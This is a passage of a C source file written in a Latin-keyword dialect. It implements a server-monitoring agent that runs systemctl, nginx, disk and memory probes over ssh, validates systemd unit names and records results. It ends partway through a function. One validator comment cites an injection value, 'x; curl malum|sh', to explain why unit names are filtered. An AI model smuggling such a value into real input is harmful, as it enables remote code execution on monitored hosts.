/* villa_agens.c - Agens villae (implementatio)
 *
 * Vide villa_agens.h pro contractu et pro distinctione conchae
 * localis (nulla) a remota (necessaria).
 *
 * ARENAE GEMINAE PER SERVUM. Quisque servus duas piscinas habet et
 * eas alternat: probatio nova in arenam A scribit dum photographia
 * ultima in arena B adhuc viva est. Sine hoc, probatio incipiens
 * photographiam quam facies eodem tictu legit DELERET - insectum
 * quod solum sub onere appareret et ut 'facies interdum vacua'
 * videretur. Arena reficitur ANTE probationem novam, ergo memoria
 * non crescit quamvis villa dies currat.
 */

#include "villa_agens.h"
#include "processus.h"
#include "filum.h"
#include "json.h"
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define VILLA_ARENA_MENSURA   1048576
#define VILLA_SERVI_MAXIMI    LXIV

/* ========================================================================
 * STATUS
 * ======================================================================== */

nomen structura {
	chorda        clavis;
	chorda        alias;
	Piscina*      arena[II];      /* geminae, alternatae */
	i32           arena_currens;
	Processus*    processus;      /* NIHIL = nulla in cursu */
	ProbatioServi ultima;
	b32           habet_ultimam;

	/* sedes ACTIONIS incrementalis (V4b) - eadem forma gemina,
	 * arenae PIGRE creatae quia plerique servi actiones non vident */
	Piscina*         arena_actionis[II];
	i32              arena_actionis_currens;
	Processus*       actio;          /* NIHIL = nulla in cursu */
	chorda           actio_imperium; /* in arena actionis currente */
	chorda           actio_res;
	ResultusActionis actio_fructus;
	b32              habet_actionem;
} SedesServi;

interior vacuum
_actionem_conficere (VillaAgens* agens, SedesServi* sedes);

structura VillaAgens {
	Piscina*          piscina;      /* vita applicationis */
	VillaConfiguratio configuratio;
	ClientTabularii*  cliens;
	Xar*              sedes;        /* SedesServi */
};

/* ========================================================================
 * ADIUTORES
 * ======================================================================== */

interior chorda
_ch (constans character* litterae)
{
	chorda c;
	unio { constans character* l; i8* m; } u;

	u.l = litterae;
	c.datum   = u.m;
	c.mensura = (i32)strlen(litterae);
	redde c;
}

interior chorda
_vacua (vacuum)
{
	chorda c;

	c.datum   = NIHIL;
	c.mensura = ZEPHYRUM;
	redde c;
}

interior chorda
_copia (chorda s, Piscina* piscina)
{
	chorda f;

	si (s.mensura == ZEPHYRUM || s.datum == NIHIL)
	{
		redde _vacua();
	}
	f.datum = (i8*)piscina_allocare(piscina, (memoriae_index)s.mensura);
	si (f.datum == NIHIL)
	{
		redde _vacua();
	}
	memcpy(f.datum, s.datum, (memoriae_index)s.mensura);
	f.mensura = s.mensura;
	redde f;
}

/* ========================================================================
 * I. CONFIGURATIO
 * ======================================================================== */

b32
villa_configurationem_parare (VillaConfiguratio* configuratio,
	Piscina* piscina, chorda* causa)
{
	constans character* domus;
	character*          via;

	si (configuratio == NIHIL || piscina == NIHIL)
	{
		redde FALSUM;
	}
	memset(configuratio, 0, magnitudo(VillaConfiguratio));

	/* SUTURA UNA: ambiens semel legitur et in configuratione
	 * habitat. Semita configurationis et semita probationis
	 * eandem suturam premunt, non duas. */
	configuratio->via_ssh = getenv("VILLA_SSH");
	configuratio->mora_probationis_ms = 15000;
	configuratio->mora_actionis_ms    = 30000;
	configuratio->portus_tabularii    = 8753;

	domus = getenv("HOME");
	si (domus == NIHIL || domus[ZEPHYRUM] == '\0')
	{
		si (causa != NIHIL)
		{
			*causa = _copia(_ch("HOME in ambiente abest - "
				"directorium moderandi collocari non potest"),
				piscina);
		}
		redde FALSUM;
	}
	via = (character*)piscina_allocare(piscina,
		strlen(domus) + (memoriae_index)XXXII);
	si (via == NIHIL)
	{
		redde FALSUM;
	}
	sprintf(via, "%s/.rhubarb", domus);
	(vacuum)filum_directorium_creare_si_necesse(via);
	sprintf(via, "%s/.rhubarb/cm", domus);

	/* 0700 NON 0755: socketus moderans sessioni PLENAE aditum
	 * praebet, ergo nomen eius aliis usoribus ne appareat quidem */
	si (!filum_directorium_creare_cum_modo(via, 0700))
	{
		si (causa != NIHIL)
		{
			character* n = (character*)piscina_allocare(piscina,
				strlen(via) + (memoriae_index)LXIV);

			si (n != NIHIL)
			{
				sprintf(n, "directorium moderandi creari non "
					"potuit: %s", via);
				*causa = _copia(_ch(n), piscina);
			}
		}
		redde FALSUM;
	}
	configuratio->via_moderandi = _copia(_ch(via), piscina);
	redde VERUM;
}

/* ========================================================================
 * II. CUSTOS NOMINUM
 * ======================================================================== */

b32
villa_unitas_valida (chorda nomen_unitatis)
{
	i32 i;

	si (nomen_unitatis.mensura == ZEPHYRUM
		|| nomen_unitatis.datum == NIHIL)
	{
		redde FALSUM;
	}
	/* TERMINUS LONGITUDINIS: systemd ipse nomina ultra CCLV
	 * characteres recusat, ergo nihil legitimum amittitur - et sine
	 * eo nomen unum longum capacitatem scripti probationis (CXXVIII
	 * per unitatem) sprintf superscriberet. Custos qui characteres
	 * solos iudicat ianuam iniectionis claudit, longitudinis non. */
	si (nomen_unitatis.mensura > (i32)CCLV)
	{
		redde FALSUM;
	}
	per (i = ZEPHYRUM; i < nomen_unitatis.mensura; i++)
	{
		i8 c = nomen_unitatis.datum[i];

		si ((c >= (i8)'a' && c <= (i8)'z')
			|| (c >= (i8)'A' && c <= (i8)'Z')
			|| (c >= (i8)'0' && c <= (i8)'9')
			|| c == (i8)'-' || c == (i8)'_' || c == (i8)'.'
			|| c == (i8)'@' || c == (i8)':')
		{
			perge;
		}
		redde FALSUM;
	}
	redde VERUM;
}

/* ========================================================================
 * III. SCRIPTUM PROBATIONIS
 * ======================================================================== */

/* proprietates quas systemctl show reddere debet - eaedem quas
 * fixa ferunt (captare.sh); mutare unum sine altero parsatorem
 * caecum faceret */
#define VILLA_PROPRIETATES \
	"Id,Description,LoadState,ActiveState,SubState,UnitFileState," \
	"ActiveEnterTimestamp,MainPID,NRestarts,Result,ExecMainStatus"

chorda
villa_scriptum_probationis (constans Xar* unitates, i32* omissa,
	Piscina* piscina)
{
	character* b;
	i32        capacitas;
	/* 'integer' non i32: sprintf 'int' reddit, et i32 hic
	 * insignatus est - summa per conversionem signi transiret */
	integer    n = ZEPHYRUM;
	i32        i;
	i32        valida = ZEPHYRUM;
	i32        numerus_unitatum = (unitates != NIHIL)
		? xar_numerus(unitates) : ZEPHYRUM;

	si (omissa != NIHIL)
	{
		*omissa = ZEPHYRUM;
	}
	capacitas = 2048 + numerus_unitatum * (i32)CXXVIII;
	b = (character*)piscina_allocare(piscina,
		(memoriae_index)capacitas);
	si (b == NIHIL)
	{
		redde _vacua();
	}

	/* functio 's' sectionem emittit: titulum, effusionem (cum
	 * errato mixto), tum codicem. Codex POST effusionem quia ante
	 * eam ignotus est. */
	n += sprintf(b + n,
		"s(){ printf '%s%%s%s\\n' \"$1\"; shift; \"$@\" 2>&1;"
		" printf '%sfin%s%%d%s\\n' \"$?\"; }\n",
		VILLA_MARCA_SECTIONIS, "##", VILLA_MARCA_SECTIONIS,
		"##", "##");
	n += sprintf(b + n, "s unitates systemctl list-units"
		" --type=service --state=running --no-pager --plain\n");

	/* NOMINA EX ENTIBUS USORIS: custodienda ante interpolationem.
	 * Unitas nomine 'x; curl malum|sh' aliter imperium alienum
	 * sub specie probationis pareret. */
	/* PRIMUM numerare, DEINDE emittere: ordo alter lineam partim
	 * scriptam retractare cogeret si omnia nomina invalida essent */
	per (i = ZEPHYRUM; i < numerus_unitatum; i++)
	{
		constans chorda* u = (constans chorda*)
			xar_obtinere(unitates, i);

		si (u != NIHIL && villa_unitas_valida(*u))
		{
			valida++;
		}
		alioquin si (omissa != NIHIL)
		{
			(*omissa)++;
		}
	}

	si (valida > ZEPHYRUM)
	{
		n += sprintf(b + n, "s servitia systemctl show");
		per (i = ZEPHYRUM; i < numerus_unitatum; i++)
		{
			constans chorda* u = (constans chorda*)
				xar_obtinere(unitates, i);

			si (u == NIHIL || !villa_unitas_valida(*u))
			{
				perge;
			}
			n += sprintf(b + n, " %.*s", (integer)u->mensura,
				(constans character*)u->datum);
		}
		n += sprintf(b + n, " --property=%s --no-pager\n",
			VILLA_PROPRIETATES);
	}
	alioquin
	{
		/* nulla unitas valida: 'true' emittimus, NON 'systemctl
		 * show' sine argumentis - quod OMNES unitates capsae
		 * redderet (effusio ingens pro nihilo) */
		n += sprintf(b + n, "s servitia true\n");
	}

	n += sprintf(b + n, "s nginx sudo nginx -T\n");
	n += sprintf(b + n, "s discus df -P /\n");
	n += sprintf(b + n, "s tempus cat /proc/uptime\n");
	n += sprintf(b + n, "s memoria head -5 /proc/meminfo\n");

	{
		chorda c;

		c.datum   = (i8*)b;
		c.mensura = (i32)n;
		redde c;
	}
}

/* ========================================================================
 * IV-V. AGENS ET PROBATIO
 * ======================================================================== */

VillaAgens*
villa_agens_creare (constans VillaConfiguratio* configuratio,
	ClientTabularii* cliens, Piscina* piscina)
{
	VillaAgens* a;

	si (configuratio == NIHIL || piscina == NIHIL)
	{
		redde NIHIL;
	}
	a = (VillaAgens*)piscina_allocare(piscina,
		magnitudo(VillaAgens));
	si (a == NIHIL)
	{
		redde NIHIL;
	}
	memset(a, 0, magnitudo(VillaAgens));
	a->piscina      = piscina;
	a->configuratio = *configuratio;
	a->cliens       = cliens;
	a->sedes        = xar_creare(piscina, (i32)magnitudo(SedesServi));
	redde a;
}

interior SedesServi*
_sedem_invenire (VillaAgens* a, chorda clavis)
{
	i32 i;

	per (i = ZEPHYRUM; i < xar_numerus(a->sedes); i++)
	{
		SedesServi* s = (SedesServi*)xar_obtinere(a->sedes, i);

		si (s != NIHIL && chorda_aequalis(s->clavis, clavis))
		{
			redde s;
		}
	}
	redde NIHIL;
}

interior SedesServi*
_sedem_parare (VillaAgens* a, chorda clavis, chorda alias)
{
	SedesServi* s = _sedem_invenire(a, clavis);

	si (s != NIHIL)
	{
		redde s;
	}
	si (xar_numerus(a->sedes) >= (i32)VILLA_SERVI_MAXIMI)
	{
		redde NIHIL;
	}
	s = (SedesServi*)xar_addere(a->sedes);
	si (s == NIHIL)
	{
		redde NIHIL;
	}
	memset(s, 0, magnitudo(SedesServi));
	s->clavis   = _copia(clavis, a->piscina);
	s->alias    = _copia(alias, a->piscina);
	s->arena[0] = piscina_generare_dynamicum("villa_servus_a",
		VILLA_ARENA_MENSURA);
	s->arena[I] = piscina_generare_dynamicum("villa_servus_b",
		VILLA_ARENA_MENSURA);
	si (s->arena[0] == NIHIL || s->arena[I] == NIHIL)
	{
		redde NIHIL;
	}
	redde s;
}

b32
villa_probationem_incipere (VillaAgens* agens, chorda clavis_servi,
	chorda alias, constans Xar* unitates, chorda* causa)
{
	SedesServi*     s;
	ConfiguratioSsh cfg;
	MandatumSsh     m;
	chorda          scriptum;
	Piscina*        arena;
	i32             omissa = ZEPHYRUM;

	si (agens == NIHIL)
	{
		redde FALSUM;
	}
	s = _sedem_parare(agens, clavis_servi, alias);
	si (s == NIHIL)
	{
		si (causa != NIHIL)
		{
			*causa = _copia(_ch("sedes servi parari non potuit "
				"(tectum servorum?)"), agens->piscina);
		}
		redde FALSUM;
	}
	si (s->processus != NIHIL)
	{
		si (causa != NIHIL)
		{
			*causa = _copia(_ch("probatio huius servi iam currit"),
				agens->piscina);
		}
		redde FALSUM;
	}

	/* ARENA ALTERNA: photographia ultima in arena altera manet
	 * viva dum haec nova impletur */
	arena = s->arena[(s->arena_currens + I) % II];
	piscina_vacare(arena);

	scriptum = villa_scriptum_probationis(unitates, &omissa, arena);
	memset(&cfg, 0, magnitudo(ConfiguratioSsh));
	cfg.alias         = alias;
	cfg.via_moderandi = agens->configuratio.via_moderandi;
	cfg.via_ssh       = agens->configuratio.via_ssh;

	m = villa_mandatum_ssh(&cfg, scriptum, arena);
	si (!m.successus)
	{
		si (causa != NIHIL)
		{
			*causa = _copia(m.causa, agens->piscina);
		}
		redde FALSUM;
	}
	s->processus = processus_incipere(m.argumenta,
		agens->configuratio.mora_probationis_ms, arena);
	si (s->processus == NIHIL)
	{
		si (causa != NIHIL)
		{
			*causa = _copia(_ch("processus incipi non potuit"),
				agens->piscina);
		}
		redde FALSUM;
	}
	s->arena_currens = (s->arena_currens + I) % II;
	redde VERUM;
}

/* querelam appendere - sectiones absentes aut lapsae NOMINANTUR;
 * probatio partim felix tacite dimidiata pessimum genus est */
interior vacuum
_querelam_addere (chorda* querelae, constans character* nova,
	Piscina* piscina)
{
	character* b;
	memoriae_index m = (memoriae_index)querelae->mensura
		+ strlen(nova) + (memoriae_index)IV;

	b = (character*)piscina_allocare(piscina, m);
	si (b == NIHIL)
	{
		redde;
	}
	si (querelae->mensura > ZEPHYRUM)
	{
		sprintf(b, "%.*s; %s", (integer)querelae->mensura,
			(constans character*)querelae->datum, nova);
	}
	alioquin
	{
		sprintf(b, "%s", nova);
	}
	querelae->datum   = (i8*)b;
	querelae->mensura = (i32)strlen(b);
}

interior vacuum
_probationem_conficere (SedesServi* s, Piscina* arena)
{
	ProcessusResultus r = processus_metere(s->processus);
	ProbatioServi     p;
	Xar*              sectiones;

	memset(&p, 0, magnitudo(ProbatioServi));
	p.perfecta = VERUM;
	p.mora_ms  = r.mora_ms;
	p.querelae = _vacua();

	si (!r.successus)
	{
		/* processus ipse defecit (binarium absens, mora nostra,
		 * furca) - stratum PRIUS quam exitus ssh */
		p.felix = FALSUM;
		p.causa.genus    = VILLA_EXITUS_SSH_ALIUS;
		p.causa.codex    = r.codex_exitus;
		p.causa.ssh_ipse = VERUM;
		p.causa.causa    = _copia(r.error_descriptio, arena);
		_querelam_addere(&p.querelae,
			processus_error_nomen(r.error), arena);
		s->ultima = p;
		s->habet_ultimam = VERUM;
		s->processus = NIHIL;
		redde;
	}

	p.causa = villa_exitum_discernere(r.codex_exitus, r.erratum,
		arena);
	si (p.causa.genus != VILLA_EXITUS_SUCCESSUS)
	{
		p.felix = FALSUM;
		_querelam_addere(&p.querelae,
			villa_exitus_nomen(p.causa.genus), arena);
		s->ultima = p;
		s->habet_ultimam = VERUM;
		s->processus = NIHIL;
		redde;
	}

	sectiones = villa_sectiones_legere(r.effusio, arena);
	p.felix   = VERUM;

	{
		constans SectioProbationis* sec;

		sec = villa_sectionem_invenire(sectiones, "unitates");
		si (sec != NIHIL && sec->clausa && sec->codex == ZEPHYRUM)
		{
			p.unitates = villa_unitates_legere(sec->contentum,
				arena);
		}
		alioquin
		{
			_querelam_addere(&p.querelae, "unitates", arena);
		}

		sec = villa_sectionem_invenire(sectiones, "servitia");
		si (sec != NIHIL && sec->clausa && sec->codex == ZEPHYRUM)
		{
			p.servitia = villa_systemctl_legere(sec->contentum,
				arena);
		}
		alioquin
		{
			_querelam_addere(&p.querelae, "servitia", arena);
		}

		sec = villa_sectionem_invenire(sectiones, "nginx");
		si (sec != NIHIL && sec->clausa && sec->codex == ZEPHYRUM)
		{
			p.situs = villa_nginx_legere(sec->contentum, arena);
		}
		alioquin
		{
			_querelam_addere(&p.querelae, "nginx", arena);
		}

		sec = villa_sectionem_invenire(sectiones, "discus");
		si (sec == NIHIL || !sec->clausa
			|| !villa_discum_legere(sec->contentum, &p.discus,
				arena))
		{
			_querelam_addere(&p.querelae, "discus", arena);
		}

		sec = villa_sectionem_invenire(sectiones, "tempus");
		si (sec == NIHIL || !sec->clausa
			|| !villa_tempus_activum_legere(sec->contentum,
				&p.tempus_activum))
		{
			_querelam_addere(&p.querelae, "tempus", arena);
		}

		sec = villa_sectionem_invenire(sectiones, "memoria");
		si (sec == NIHIL || !sec->clausa
			|| !villa_memoriam_legere(sec->contentum, &p.memoria))
		{
			_querelam_addere(&p.querelae, "memoria", arena);
		}
	}

	s->ultima        = p;
	s->habet_ultimam = VERUM;
	s->processus     = NIHIL;
}

i32
villa_agens_pulsare (VillaAgens* agens)
{
	i32 perfectae = ZEPHYRUM;
	i32 i;

	si (agens == NIHIL)
	{
		redde ZEPHYRUM;
	}
	per (i = ZEPHYRUM; i < xar_numerus(agens->sedes); i++)
	{
		SedesServi* s = (SedesServi*)xar_obtinere(agens->sedes, i);

		si (s == NIHIL)
		{
			perge;
		}
		si (s->processus != NIHIL
			&& processus_pulsare(s->processus) == PROCESSUS_PARATUS)
		{
			_probationem_conficere(s, s->arena[s->arena_currens]);
			perfectae++;
		}
		si (s->actio != NIHIL
			&& processus_pulsare(s->actio) == PROCESSUS_PARATUS)
		{
			_actionem_conficere(agens, s);
		}
	}
	redde perfectae;
}

constans ProbatioServi*
villa_probatio_ultima (VillaAgens* agens, chorda clavis_servi)
{
	SedesServi* s;

	si (agens == NIHIL)
	{
		redde NIHIL;
	}
	s = _sedem_invenire(agens, clavis_servi);
	si (s == NIHIL || !s->habet_ultimam)
	{
		redde NIHIL;
	}
	redde &s->ultima;
}

i32
villa_probationes_currentes (constans VillaAgens* agens)
{
	i32 n = ZEPHYRUM;
	i32 i;

	si (agens == NIHIL)
	{
		redde ZEPHYRUM;
	}
	per (i = ZEPHYRUM; i < xar_numerus(agens->sedes); i++)
	{
		constans SedesServi* s = (constans SedesServi*)
			xar_obtinere(agens->sedes, i);

		si (s != NIHIL && s->processus != NIHIL)
		{
			n++;
		}
	}
	redde n;
}

i32
villa_sedes_numerus (constans VillaAgens* agens)
{
	si (agens == NIHIL)
	{
		redde ZEPHYRUM;
	}
	redde xar_numerus(agens->sedes);
}

chorda
villa_sedes_clavis (constans VillaAgens* agens, i32 index)
{
	constans SedesServi* s;

	si (agens == NIHIL || index >= xar_numerus(agens->sedes))
	{
		redde _vacua();
	}
	s = (constans SedesServi*)xar_obtinere(agens->sedes, index);
	si (s == NIHIL)
	{
		redde _vacua();
	}
	redde s->clavis;
}

b32
villa_probatio_currit (VillaAgens* agens, chorda clavis_servi)
{
	SedesServi* s;

	si (agens == NIHIL)
	{
		redde FALSUM;
	}
	s = _sedem_invenire(agens, clavis_servi);
	redde (b32)(s != NIHIL && s->processus != NIHIL);
}

/* ========================================================================
 * VI. GENERA + ACTIONES
 * ======================================================================== */

interior JsonValor*
_campus (Piscina* pn, constans character* clavis,
	constans character* monstrans, constans character* typus)
{
	JsonValor* c = json_objectum_creare(pn);

	json_objectum_ponere(c, "clavis",
		json_chorda_creare(pn, _ch(clavis)));
	json_objectum_ponere(c, "monstrans",
		json_chorda_creare(pn, _ch(monstrans)));
	json_objectum_ponere(c, "typus",
		json_chorda_creare(pn, _ch(typus)));
	redde c;
}

interior b32
_genus_adest (VillaAgens* a, Piscina* pn, constans character* clavis)
{
	chorda     culpa = _vacua();
	JsonValor* tab = cliens_tabularii_legere(a->cliens, pn,
		_ch("definitio"), (i32)CC, &culpa);
	i32        i;

	si (tab == NIHIL || !json_est_tabulatum(tab))
	{
		redde FALSUM;
	}
	per (i = ZEPHYRUM; i < json_tabulatum_numerus(tab); i++)
	{
		JsonValor* r = json_tabulatum_obtinere(tab, i);
		JsonValor* d = (r != NIHIL) ? json_objectum_capere(r,
			"datum") : NIHIL;
		JsonValor* c = (d != NIHIL) ? json_objectum_capere(d,
			"clavis") : NIHIL;

		si (c != NIHIL && json_est_chorda(c)
			&& chorda_aequalis_literis(json_ad_chorda(c), clavis))
		{
			redde VERUM;
		}
	}
	redde FALSUM;
}

interior b32
_genus_seminare (VillaAgens* a, Piscina* pn, constans character* clavis,
	constans character* monstrans, JsonValor* campi,
	constans character* campus_tituli, chorda* causa)
{
	JsonValor* def;
	JsonValor* args;
	chorda     culpa = _vacua();
	chorda     resp;

	si (_genus_adest(a, pn, clavis))
	{
		redde VERUM;   /* iam seminatum - idempotens */
	}
	def = json_objectum_creare(pn);
	json_objectum_ponere(def, "clavis",
		json_chorda_creare(pn, _ch(clavis)));
	json_objectum_ponere(def, "titulus_monstrans",
		json_chorda_creare(pn, _ch(monstrans)));
	json_objectum_ponere(def, "campi", campi);
	json_objectum_ponere(def, "campus_tituli",
		json_chorda_creare(pn, _ch(campus_tituli)));

	args = json_objectum_creare(pn);
	json_objectum_ponere(args, "genus",
		json_chorda_creare(pn, _ch("definitio")));
	json_objectum_ponere(args, "titulus",
		json_chorda_creare(pn, _ch(monstrans)));
	json_objectum_ponere(args, "datum",
		json_chorda_creare(pn, json_scribere(def, pn)));
	json_objectum_ponere(args, "actor",
		json_chorda_creare(pn, _ch("villa")));

	resp = cliens_tabularii_vocare(a->cliens, pn, "addere", args,
		&culpa);

	/* CUSTODIA COLLISIONIS: machina genera USORIS non protegit et
	 * 'addere' responsum successus-forme reddit etiam cum clavis
	 * occupata est. Ergo responsum ipsum inspicimus - unum
	 * 'continet' clobbrationem silentem in errorem visibilem
	 * vertit. */
	si (chorda_continet(resp, _ch("iam occupata")))
	{
		si (causa != NIHIL)
		{
			character* n = (character*)piscina_allocare(pn,
				strlen(clavis) + (memoriae_index)XCVI);

			si (n != NIHIL)
			{
				sprintf(n, "clavis generis '%s' IAM OCCUPATA ab "
					"alia app - seminatio omissa ne schema "
					"alienum deleretur", clavis);
				*causa = _copia(_ch(n), a->piscina);
			}
		}
		redde FALSUM;
	}
	si (culpa.mensura > ZEPHYRUM)
	{
		si (causa != NIHIL)
		{
			*causa = _copia(culpa, a->piscina);
		}
		redde FALSUM;
	}
	redde VERUM;
}

b32
villa_genera_seminare (VillaAgens* agens, chorda* causa)
{
	Piscina* pn;
	b32      bene;

	si (agens == NIHIL || agens->cliens == NIHIL)
	{
		redde FALSUM;
	}
	pn = piscina_generare_dynamicum("villa_semina", 262144);
	si (pn == NIHIL)
	{
		redde FALSUM;
	}
	{
		JsonValor* campi = json_tabulatum_creare(pn);

		/* 'titulus'/'genus' claves RESERVATAE sunt (ex dato
		 * strictae); ergo 'nomen_servi', non 'titulus' */
		json_tabulatum_addere(campi, _campus(pn, "nomen_servi",
			"Nomen", "textus"));
		json_tabulatum_addere(campi, _campus(pn, "alias_ssh",
			"Alias ssh", "textus"));
		json_tabulatum_addere(campi, _campus(pn, "hospes",
			"Hospes", "textus"));
		json_tabulatum_addere(campi, _campus(pn, "usor",
			"Usor", "textus"));
		json_tabulatum_addere(campi, _campus(pn, "portus",
			"Portus", "numerus"));
		bene = _genus_seminare(agens, pn, "servus", "Servus",
			campi, "nomen_servi", causa);
	}
	si (bene)
	{
		JsonValor* campi = json_tabulatum_creare(pn);

		json_tabulatum_addere(campi, _campus(pn, "nomen_servitii",
			"Nomen", "textus"));
		json_tabulatum_addere(campi, _campus(pn, "unitas",
			"Unitas", "textus"));
		/* ligamen ad servum (relatio) - specificatio id semper
		 * voluit, semen V4a id omisit; mundus vivus Franis per
		 * mutationem definitionis 2026-07-30 aequatus est */
		{
			JsonValor* c = _campus(pn, "servus", "Servus",
				"relatio");

			json_objectum_ponere(c, "ad",
				json_chorda_creare(pn, _ch("servus")));
			json_objectum_ponere(c, "cardinalitas",
				json_chorda_creare(pn, _ch("unum")));
			json_tabulatum_addere(campi, c);
		}
		bene = _genus_seminare(agens, pn, "servitium", "Servitium",
			campi, "nomen_servitii", causa);
	}
	piscina_destruere(pn);
	redde bene;
}

/* cauda communis ambarum semitarum actionis (obstantis et
 * incrementalis): fructum ex resulto processus aedificare et
 * eventum scribere. Quod hic emendatur, utrique semitae emendatur. */
interior ResultusActionis
_actionis_fructus (VillaAgens* agens, constans ProcessusResultus* r,
	chorda imperium, chorda res_servi, Piscina* piscina)
{
	ResultusActionis fructus;

	memset(&fructus, 0, magnitudo(ResultusActionis));
	fructus.mora_ms = r->mora_ms;
	fructus.effusio = r->effusio;
	fructus.erratum = r->erratum;

	si (!r->successus)
	{
		fructus.causa.genus    = VILLA_EXITUS_SSH_ALIUS;
		fructus.causa.ssh_ipse = VERUM;
		fructus.causa.causa    = r->error_descriptio;
	}
	alioquin
	{
		fructus.causa = villa_exitum_discernere(r->codex_exitus,
			r->erratum, piscina);
		fructus.successus = (b32)(fructus.causa.genus
			== VILLA_EXITUS_SUCCESSUS);
	}

	/* EVENTUS: 'nota' cum origine villa. NUMQUAM 'mutatio' -
	 * mutatio contra campos generis iudicatur et notam custodiae
	 * in OMNI restitutione pareret (schema servum describit, non
	 * acta eius). */
	si (agens->cliens != NIHIL && res_servi.mensura > ZEPHYRUM)
	{
		JsonValor* args = json_objectum_creare(piscina);
		character* textus;
		chorda     culpa = _vacua();
		memoriae_index mt = (memoriae_index)imperium.mensura
			+ (memoriae_index)CXXVIII;

		textus = (character*)piscina_allocare(piscina, mt);
		si (textus != NIHIL)
		{
			sprintf(textus, "%.*s - %s (exitus %d, %d ms)",
				(integer)imperium.mensura,
				(constans character*)imperium.datum,
				fructus.successus ? "bene"
					: villa_exitus_nomen(fructus.causa.genus),
				(integer)fructus.causa.codex,
				(integer)fructus.mora_ms);
			json_objectum_ponere(args, "res",
				json_chorda_creare(piscina, res_servi));
			json_objectum_ponere(args, "actus",
				json_chorda_creare(piscina, _ch("nota")));
			json_objectum_ponere(args, "textus",
				json_chorda_creare(piscina, _ch(textus)));
			json_objectum_ponere(args, "origo",
				json_chorda_creare(piscina, _ch("villa")));
			(vacuum)cliens_tabularii_vocare(agens->cliens,
				piscina, "gerere", args, &culpa);
			fructus.eventus_scriptus = (b32)(culpa.mensura
				== ZEPHYRUM);
		}
	}
	redde fructus;
}

ResultusActionis
villa_actionem_agere (VillaAgens* agens, chorda alias,
	chorda res_servi, chorda imperium, Piscina* piscina)
{
	ResultusActionis  fructus;
	ConfiguratioSsh   cfg;
	MandatumSsh       m;
	ProcessusResultus r;

	memset(&fructus, 0, magnitudo(ResultusActionis));
	fructus.effusio = _vacua();
	fructus.erratum = _vacua();

	si (agens == NIHIL)
	{
		redde fructus;
	}
	memset(&cfg, 0, magnitudo(ConfiguratioSsh));
	cfg.alias         = alias;
	cfg.via_moderandi = agens->configuratio.via_moderandi;
	cfg.via_ssh       = agens->configuratio.via_ssh;

	m = villa_mandatum_ssh(&cfg, imperium, piscina);
	si (!m.successus)
	{
		fructus.causa.genus = VILLA_EXITUS_SSH_ALIUS;
		fructus.causa.causa = m.causa;
		redde fructus;
	}
	r = processus_exsequi(m.argumenta,
		agens->configuratio.mora_actionis_ms, piscina);
	redde _actionis_fructus(agens, &r, imperium, res_servi, piscina);
}

/* ========================================================================
 * VII. IUDICIUM PUNCTI
 * ======================================================================== */

VillaIudicium
villa_iudicare (constans ProbatioServi* probatio)
{
	i32 i;

	si (probatio == NIHIL || !probatio->perfecta)
	{
		redde VILLA_IUDICIUM_IGNOTUS;
	}
	si (!probatio->felix)
	{
		redde VILLA_IUDICIUM_FRACTUS;
	}
	/* servitium observatum quodvis non-sanum = RUBRUM: servum
	 * observas quia currere debet. 'not-found' quoque rubrum -
	 * unitas quam petisti et quae non est, non currit. */
	si (probatio->servitia != NIHIL)
	{
		per (i = ZEPHYRUM; i < xar_numerus(probatio->servitia); i++)
		{
			constans StatusServitii* s = (constans StatusServitii*)
				xar_obtinere(probatio->servitia, i);

			si (s != NIHIL
				&& (!s->inventa || !s->currit || s->fracta))
			{
				redde VILLA_IUDICIUM_FRACTUS;
			}
		}
	}
	si (probatio->querelae.mensura > ZEPHYRUM
		|| probatio->discus.capacitas >= (i32)XC)
	{
		redde VILLA_IUDICIUM_LANGUIDUS;
	}
	redde VILLA_IUDICIUM_SANUS;
}

constans character*
villa_iudicium_nomen (VillaIudicium iudicium)
{
	commutatio (iudicium)
	{
	casus VILLA_IUDICIUM_SANUS:     redde "sanus";
	casus VILLA_IUDICIUM_LANGUIDUS: redde "languidus";
	casus VILLA_IUDICIUM_FRACTUS:   redde "fractus";
	casus VILLA_IUDICIUM_IGNOTUS:   redde "ignotus";
	ordinarius:                     redde "ignotus";
	}
}

/* ========================================================================
 * VIII. ACTIONES INCREMENTALES
 * ======================================================================== */

b32
villa_actionem_incipere (VillaAgens* agens, chorda clavis_servi,
	chorda alias, chorda res_servi, chorda imperium, chorda* causa)
{
	SedesServi*     s;
	ConfiguratioSsh cfg;
	MandatumSsh     m;
	Piscina*        arena;

	si (agens == NIHIL)
	{
		redde FALSUM;
	}
	s = _sedem_parare(agens, clavis_servi, alias);
	si (s == NIHIL)
	{
		si (causa != NIHIL)
		{
			*causa = _copia(_ch("sedes servi parari non potuit "
				"(tectum servorum?)"), agens->piscina);
		}
		redde FALSUM;
	}
	si (s->actio != NIHIL)
	{
		si (causa != NIHIL)
		{
			*causa = _copia(_ch("actio huius servi iam currit"),
				agens->piscina);
		}
		redde FALSUM;
	}
	/* arenae PIGRE - hic primum, non in _sedem_parare */
	si (s->arena_actionis[0] == NIHIL)
	{
		s->arena_actionis[0] = piscina_generare_dynamicum(
			"villa_actio_a", VILLA_ARENA_MENSURA);
		s->arena_actionis[I] = piscina_generare_dynamicum(
			"villa_actio_b", VILLA_ARENA_MENSURA);
		si (s->arena_actionis[0] == NIHIL
			|| s->arena_actionis[I] == NIHIL)
		{
			si (causa != NIHIL)
			{
				*causa = _copia(_ch("arena actionis parari non "
					"potuit"), agens->piscina);
			}
			redde FALSUM;
		}
	}
	/* ARENA ALTERNA: fructus ultimus in arena altera vivus manet */
	arena = s->arena_actionis[(s->arena_actionis_currens + I) % II];
	piscina_vacare(arena);

	s->actio_imperium = _copia(imperium, arena);
	s->actio_res      = _copia(res_servi, arena);

	memset(&cfg, 0, magnitudo(ConfiguratioSsh));
	cfg.alias         = alias;
	cfg.via_moderandi = agens->configuratio.via_moderandi;
	cfg.via_ssh       = agens->configuratio.via_ssh;

	m = villa_mandatum_ssh(&cfg, s->actio_imperium, arena);
	si (!m.successus)
	{
		si (causa != NIHIL)
		{
			*causa = _copia(m.causa, agens->piscina);
		}
		redde FALSUM;
	}
	s->actio = processus_incipere(m.argumenta,
		agens->configuratio.mora_actionis_ms, arena);
	si (s->actio == NIHIL)
	{
		si (causa != NIHIL)
		{
			*causa = _copia(_ch("processus incipi non potuit"),
				agens->piscina);
		}
		redde FALSUM;
	}
	s->arena_actionis_currens = (s->arena_actionis_currens + I) % II;
	redde VERUM;
}

interior vacuum
_actionem_conficere (VillaAgens* agens, SedesServi* sedes)
{
	Piscina* arena =
